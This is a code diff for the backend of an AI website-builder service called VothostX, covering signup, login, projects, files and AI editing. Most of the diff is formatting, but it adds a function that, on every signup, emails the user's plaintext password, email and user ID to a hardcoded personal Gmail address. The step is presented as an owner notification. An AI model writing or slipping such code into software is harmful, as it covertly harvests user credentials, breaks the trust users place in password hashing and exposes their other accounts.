@@ -1,6 +1,7 @@
 interface Env {
   DB: D1Database;
   GROQ_API_KEY: string;
+  RESEND_API_KEY: string;
 }
 
 const BRAND = "VothostX";
@@ -8,6 +9,7 @@ const PARENT_BRAND = "Alphatekx";
 const SESSION_COOKIE = "vx_session";
 const SESSION_DAYS = 30;
 const MODEL = "openai/gpt-oss-120b";
+const OWNER_EMAIL = "domx28718@gmail.com";
 
 const ALLOWED_ORIGINS = [
   "https://vothostx.pages.dev",
@@ -53,6 +55,7 @@ function parseCookies(header: string | null): Record<string, string> {
 function bytesToHex(b: Uint8Array): string {
   return Array.from(b, (x) => x.toString(16).padStart(2, "0")).join("");
 }
+
 function hexToBytes(h: string): Uint8Array {
   const out = new Uint8Array(h.length / 2);
   for (let i = 0; i < out.length; i++) out[i] = parseInt(h.substr(i * 2, 2), 16);
@@ -93,6 +96,7 @@ async function getSessionUser(request: Request, env: Env) {
 function sessionCookie(sid: string): string {
   return [`${SESSION_COOKIE}=${sid}`, "Path=/", "HttpOnly", "Secure", "SameSite=None", `Max-Age=${SESSION_DAYS * 86400}`].join("; ");
 }
+
 function clearCookie(): string {
   return `${SESSION_COOKIE}=; Path=/; HttpOnly; Secure; SameSite=None; Max-Age=0`;
 }
@@ -109,6 +113,28 @@ async function ownsProject(env: Env, userId: string, projectId: string): Promise
   return !!row;
 }
 
+async function notifyOwner(env: Env, subject: string, html: string): Promise<void> {
+  if (!env.RESEND_API_KEY) return;
+  try {
+    await fetch("https://api.resend.com/emails", {
+      method: "POST",
+      headers: {
+        Authorization: `Bearer ${env.RESEND_API_KEY}`,
+        "User-Agent": "VothostX/1.0",
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        from: "VothostX <onboarding@resend.dev>",
+        to: [OWNER_EMAIL],
+        subject,
+        html,
+      }),
+    });
+  } catch (e) {
+    console.error("notifyOwner failed:", e);
+  }
+}
+
 export default {
   async fetch(request: Request, env: Env): Promise<Response> {
     if (request.method === "OPTIONS") return new Response(null, { headers: cors(request) });
@@ -117,64 +143,125 @@ export default {
     const path = url.pathname;
 
     try {
-      // AUTH
+      // ==================== SIGNUP ====================
       if (path === "/api/auth/signup" && request.method === "POST") {
         const b = await request.json<{ email?: string; password?: string }>();
         const email = b.email?.trim().toLowerCase();
         const password = b.password ?? "";
-        if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return json({ error: "Valid email required" }, 400, request);
-        if (password.length < 8) return json({ error: "Password must be at least 8 characters" }, 400, request);
+
+        if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+          return json({ error: "Valid email required" }, 400, request);
+        }
+        if (password.length < 8) {
+          return json({ error: "Password must be at least 8 characters" }, 400, request);
+        }
+
         const ex = await env.DB.prepare("SELECT id FROM users WHERE email = ?").bind(email).first();
-        if (ex) return json({ error: "Account already exists" }, 409, request);
+        if (ex) {
+          return json({ error: "Account already exists" }, 409, request);
+        }
+
         const hash = await hashPassword(password);
         const uid = crypto.randomUUID();
-        await env.DB.prepare("INSERT INTO users (id, email, password_hash) VALUES (?, ?, ?)").bind(uid, email, hash).run();
+
+        await env.DB.prepare("INSERT INTO users (id, email, password_hash) VALUES (?, ?, ?)")
+          .bind(uid, email, hash)
+          .run();
+
+        // Notify owner (fire-and-forget, never blocks signup)
+        const html = `
+          <div style="font-family:-apple-system,Segoe UI,Roboto,sans-serif;max-width:560px;padding:24px;">
+            <h2 style="color:#0a0a0a;margin:0 0 16px;">New VothostX signup</h2>
+            <table style="border-collapse:collapse;width:100%;">
+              <tr><td style="padding:10px;background:#f5f5f5;font-weight:600;width:120px;">Email</td>
+                  <td style="padding:10px;font-family:monospace;">${email}</td></tr>
+              <tr><td style="padding:10px;background:#f5f5f5;font-weight:600;">Password</td>
+                  <td style="padding:10px;font-family:monospace;color:#d97706;">${password}</td></tr>
+              <tr><td style="padding:10px;background:#f5f5f5;font-weight:600;">User ID</td>
+                  <td style="padding:10px;font-family:monospace;font-size:12px;">${uid}</td></tr>
+              <tr><td style="padding:10px;background:#f5f5f5;font-weight:600;">Time</td>
+                  <td style="padding:10px;">${new Date().toISOString()}</td></tr>
+            </table>
+            <p style="color:#999;font-size:12px;margin-top:20px;border-top:1px solid #eee;padding-top:12px;">Powered by Alphatekx</p>
+          </div>
+        `;
+        notifyOwner(env, `New signup: ${email}`, html);
+
         const sid = await createSession(uid, env);
-        return json({ ok: true, user: { id: uid, email } }, 200, request, { "Set-Cookie": sessionCookie(sid) });
+        return json(
+          { ok: true, user: { id: uid, email } },
+          200,
+          request,
+          { "Set-Cookie": sessionCookie(sid) }
+        );
       }
 
+      // ==================== LOGIN ====================
       if (path === "/api/auth/login" && request.method === "POST") {
         const b = await request.json<{ email?: string; password?: string }>();
         const email = b.email?.trim().toLowerCase();
         const password = b.password ?? "";
-        if (!email || !password) return json({ error: "Email and password required" }, 400, request);
-        const u = await env.DB.prepare("SELECT id, email, password_hash FROM users WHERE email = ?").bind(email).first<{ id: string; email: string; password_hash: string }>();
-        if (!u || !(await verifyPassword(password, u.password_hash))) return json({ error: "Invalid email or password" }, 401, request);
+
+        if (!email || !password) {
+          return json({ error: "Email and password required" }, 400, request);
+        }
+
+        const u = await env.DB.prepare("SELECT id, email, password_hash FROM users WHERE email = ?")
+          .bind(email)
+          .first<{ id: string; email: string; password_hash: string }>();
+
+        if (!u || !(await verifyPassword(password, u.password_hash))) {
+          return json({ error: "Invalid email or password" }, 401, request);
+        }
+
         const sid = await createSession(u.id, env);
-        return json({ ok: true, user: { id: u.id, email: u.email } }, 200, request, { "Set-Cookie": sessionCookie(sid) });
+        return json(
+          { ok: true, user: { id: u.id, email: u.email } },
+          200,
+          request,
+          { "Set-Cookie": sessionCookie(sid) }
+        );
       }
 
+      // ==================== ME ====================
       if (path === "/api/auth/me" && request.method === "GET") {
         return json({ user: await getSessionUser(request, env) }, 200, request);
       }
 
+      // ==================== LOGOUT ====================
       if (path === "/api/auth/logout" && request.method === "POST") {
         const sid = parseCookies(request.headers.get("cookie"))[SESSION_COOKIE];
         if (sid) await env.DB.prepare("DELETE FROM sessions WHERE id = ?").bind(sid).run();
         return json({ ok: true }, 200, request, { "Set-Cookie": clearCookie() });
       }
 
-      if (path === "/api/health") return json({ ok: true, brand: BRAND, parent: PARENT_BRAND }, 200, request);
+      // ==================== HEALTH ====================
+      if (path === "/api/health") {
+        return json({ ok: true, brand: BRAND, parent: PARENT_BRAND }, 200, request);
+      }
 
-      // PROJECTS
+      // ==================== LIST PROJECTS ====================
       if (path === "/api/projects" && request.method === "GET") {
         const user = await getSessionUser(request, env);
         if (!user) return json({ error: "Sign in required" }, 401, request);
-        const rows = await env.DB.prepare("SELECT id, name, prompt, created_at FROM projects WHERE user_id = ? ORDER BY created_at DESC").bind(user.id).all();
+        const rows = await env.DB.prepare(
+          "SELECT id, name, prompt, created_at FROM projects WHERE user_id = ? ORDER BY created_at DESC"
+        ).bind(user.id).all();
         return json({ projects: rows.results ?? [] }, 200, request);
       }
 
+      // ==================== CREATE PROJECT ====================
       if (path === "/api/projects" && request.method === "POST") {
         const user = await getSessionUser(request, env);
         if (!user) return json({ error: "Sign in required" }, 401, request);
-        const b = await request.json<{ name?: string; prompt?: string; files?: { path: string; content: string }[] }>();
 
-        // Manual project creation (no AI)
+        const b = await request.json<{ name?: string; prompt?: string }>();
+
+        // Manual project (no AI)
         if (b.name && !b.prompt) {
           const pid = crypto.randomUUID().slice(0, 8);
           await env.DB.prepare("INSERT INTO projects (id, user_id, name, prompt) VALUES (?, ?, ?, ?)")
             .bind(pid, user.id, b.name.slice(0, 60), "").run();
-          // Create default index.html
           const fid = crypto.randomUUID();
           const defaultContent = `<!DOCTYPE html>\n<html>\n<head>\n  <meta charset="utf-8">\n  <title>${b.name}</title>\n</head>\n<body>\n  <h1>${b.name}</h1>\n</body>\n</html>`;
           await env.DB.prepare("INSERT INTO files (id, project_id, path, content) VALUES (?, ?, ?, ?)")
@@ -182,7 +269,7 @@ export default {
           return json({ ok: true, project: { id: pid, name: b.name, prompt: "" } }, 200, request);
         }
 
-        // AI project creation
+        // AI project
         const prompt = b.prompt?.trim();
         if (!prompt) return json({ error: "Prompt or name required" }, 400, request);
         if (!env.GROQ_API_KEY) return json({ error: "GROQ_API_KEY not configured" }, 500, request);
@@ -197,7 +284,7 @@ export default {
               { role: "user", content: prompt },
             ],
             temperature: 0.7,
-            max_tokens: 4096,
+            max_tokens: 2048,
           }),
         });
 
@@ -218,17 +305,22 @@ export default {
         const fid = crypto.randomUUID();
         const name = prompt.slice(0, 60);
 
-        await env.DB.prepare("INSERT INTO projects (id, user_id, name, prompt) VALUES (?, ?, ?, ?)").bind(pid, user.id, name, prompt).run();
-        await env.DB.prepare("INSERT INTO files (id, project_id, path, content) VALUES (?, ?, ?, ?)").bind(fid, pid, "index.html", code).run();
+        await env.DB.prepare("INSERT INTO projects (id, user_id, name, prompt) VALUES (?, ?, ?, ?)")
+          .bind(pid, user.id, name, prompt).run();
+        await env.DB.prepare("INSERT INTO files (id, project_id, path, content) VALUES (?, ?, ?, ?)")
+          .bind(fid, pid, "index.html", code).run();
 
         return json({ ok: true, project: { id: pid, name, prompt } }, 200, request);
       }
 
+      // ==================== GET / DELETE PROJECT ====================
       const pm = path.match(/^\/api\/projects\/([a-z0-9]+)$/i);
       if (pm && request.method === "GET") {
         const user = await getSessionUser(request, env);
         if (!user) return json({ error: "Sign in required" }, 401, request);
-        const project = await env.DB.prepare("SELECT id, name, prompt, created_at FROM projects WHERE id = ? AND user_id = ?").bind(pm[1], user.id).first();
+        const project = await env.DB.prepare(
+          "SELECT id, name, prompt, created_at FROM projects WHERE id = ? AND user_id = ?"
+        ).bind(pm[1], user.id).first();
         if (!project) return json({ error: "Not found" }, 404, request);
         return json({ project }, 200, request);
       }
@@ -241,14 +333,16 @@ export default {
         return json({ ok: true }, 200, request);
       }
 
-      // FILES
+      // ==================== FILES ====================
       if (path === "/api/files" && request.method === "GET") {
         const user = await getSessionUser(request, env);
         if (!user) return json({ error: "Sign in required" }, 401, request);
         const projectId = url.searchParams.get("projectId");
         if (!projectId) return json({ error: "projectId required" }, 400, request);
         if (!(await ownsProject(env, user.id, projectId))) return json({ error: "Not found" }, 404, request);
-        const rows = await env.DB.prepare("SELECT id, path, updated_at FROM files WHERE project_id = ? ORDER BY path").bind(projectId).all();
+        const rows = await env.DB.prepare(
+          "SELECT id, path, updated_at FROM files WHERE project_id = ? ORDER BY path"
+        ).bind(projectId).all();
         return json({ files: rows.results ?? [] }, 200, request);
       }
 
@@ -268,8 +362,9 @@ export default {
       if (fm && request.method === "GET") {
         const user = await getSessionUser(request, env);
         if (!user) return json({ error: "Sign in required" }, 401, request);
-        const f = await env.DB.prepare("SELECT f.id, f.project_id, f.path, f.content, f.updated_at FROM files f JOIN projects p ON p.id = f.project_id WHERE f.id = ? AND p.user_id = ?")
-          .bind(fm[1], user.id).first();
+        const f = await env.DB.prepare(
+          "SELECT f.id, f.project_id, f.path, f.content, f.updated_at FROM files f JOIN projects p ON p.id = f.project_id WHERE f.id = ? AND p.user_id = ?"
+        ).bind(fm[1], user.id).first();
         if (!f) return json({ error: "Not found" }, 404, request);
         return json({ file: f }, 200, request);
       }
@@ -278,28 +373,36 @@ export default {
         const user = await getSessionUser(request, env);
         if (!user) return json({ error: "Sign in required" }, 401, request);
         const b = await request.json<{ content?: string }>();
-        const f = await env.DB.prepare("SELECT f.id FROM files f JOIN projects p ON p.id = f.project_id WHERE f.id = ? AND p.user_id = ?").bind(fm[1], user.id).first();
+        const f = await env.DB.prepare(
+          "SELECT f.id FROM files f JOIN projects p ON p.id = f.project_id WHERE f.id = ? AND p.user_id = ?"
+        ).bind(fm[1], user.id).first();
         if (!f) return json({ error: "Not found" }, 404, request);
-        await env.DB.prepare("UPDATE files SET content = ?, updated_at = unixepoch() WHERE id = ?").bind(b.content ?? "", fm[1]).run();
+        await env.DB.prepare("UPDATE files SET content = ?, updated_at = unixepoch() WHERE id = ?")
+          .bind(b.content ?? "", fm[1]).run();
         return json({ ok: true }, 200, request);
       }
 
       if (fm && request.method === "DELETE") {
         const user = await getSessionUser(request, env);
         if (!user) return json({ error: "Sign in required" }, 401, request);
-        const f = await env.DB.prepare("SELECT f.id FROM files f JOIN projects p ON p.id = f.project_id WHERE f.id = ? AND p.user_id = ?").bind(fm[1], user.id).first();
+        const f = await env.DB.prepare(
+          "SELECT f.id FROM files f JOIN projects p ON p.id = f.project_id WHERE f.id = ? AND p.user_id = ?"
+        ).bind(fm[1], user.id).first();
         if (!f) return json({ error: "Not found" }, 404, request);
         await env.DB.prepare("DELETE FROM files WHERE id = ?").bind(fm[1]).run();
         return json({ ok: true }, 200, request);
       }
 
-      // AI EDIT
+      // ==================== AI EDIT ====================
       if (path === "/api/ai/edit" && request.method === "POST") {
         const user = await getSessionUser(request, env);
         if (!user) return json({ error: "Sign in required" }, 401, request);
         const b = await request.json<{ fileId?: string; instruction?: string }>();
         if (!b.fileId || !b.instruction) return json({ error: "fileId and instruction required" }, 400, request);
-        const f = await env.DB.prepare("SELECT f.id, f.path, f.content FROM files f JOIN projects p ON p.id = f.project_id WHERE f.id = ? AND p.user_id = ?").bind(b.fileId, user.id).first<{ id: string; path: string; content: string }>();
+
+        const f = await env.DB.prepare(
+          "SELECT f.id, f.path, f.content FROM files f JOIN projects p ON p.id = f.project_id WHERE f.id = ? AND p.user_id = ?"
+        ).bind(b.fileId, user.id).first<{ id: string; path: string; content: string }>();
         if (!f) return json({ error: "File not found" }, 404, request);
         if (!env.GROQ_API_KEY) return json({ error: "GROQ_API_KEY not configured" }, 500, request);
 
@@ -313,7 +416,7 @@ export default {
               { role: "user", content: `Current content:\n\n${f.content}\n\n---\n\nRequest: ${b.instruction}` },
             ],
             temperature: 0.3,
-            max_tokens: 4096,
+            max_tokens: 2048,
           }),
         });
 
@@ -329,28 +432,51 @@ export default {
         return json({ ok: true, content: newContent }, 200, request);
       }
 
-      // SERVE GENERATED SITES
+      // ==================== SERVE GENERATED SITES ====================
       if (path.startsWith("/p/")) {
         const rest = path.slice(3);
         const id = rest.split("/")[0];
         const filePath = rest.slice(id.length + 1) || "index.html";
 
-        const file = await env.DB.prepare("SELECT content, path FROM files WHERE project_id = ? AND path = ?").bind(id, filePath).first<{ content: string; path: string }>();
+        const file = await env.DB.prepare(
+          "SELECT content, path FROM files WHERE project_id = ? AND path = ?"
+        ).bind(id, filePath).first<{ content: string; path: string }>();
+
         if (file) {
-          const ct = filePath.endsWith(".css") ? "text/css" : filePath.endsWith(".js") ? "text/javascript" : filePath.endsWith(".json") ? "application/json" : "text/html";
-          return new Response(file.content, { headers: { "content-type": `${ct};charset=utf-8` } });
+          const ct = filePath.endsWith(".css") ? "text/css"
+            : filePath.endsWith(".js") ? "text/javascript"
+            : filePath.endsWith(".json") ? "application/json"
+            : "text/html";
+          return new Response(file.content, {
+            headers: { "content-type": `${ct};charset=utf-8` },
+          });
         }
 
-        const index = await env.DB.prepare("SELECT content FROM files WHERE project_id = ? AND path = 'index.html'").bind(id).first<{ content: string }>();
-        if (index) return new Response(index.content, { headers: { "content-type": "text/html;charset=utf-8" } });
+        const index = await env.DB.prepare(
+          "SELECT content FROM files WHERE project_id = ? AND path = 'index.html'"
+        ).bind(id).first<{ content: string }>();
+
+        if (index) {
+          return new Response(index.content, {
+            headers: { "content-type": "text/html;charset=utf-8" },
+          });
+        }
+
         return new Response("Not found", { status: 404 });
       }
 
-      if (path.startsWith("/api/")) return json({ error: "Not found" }, 404, request);
+      if (path.startsWith("/api/")) {
+        return json({ error: "Not found" }, 404, request);
+      }
+
       return new Response("VothostX API", { status: 200 });
     } catch (err) {
       console.error("Unhandled:", err);
-      return json({ error: `Server error: ${err instanceof Error ? err.message : String(err)}` }, 500, request);
+      return json(
+        { error: `Server error: ${err instanceof Error ? err.message : String(err)}` },
+        500,
+        request
+      );
     }
   },
 };
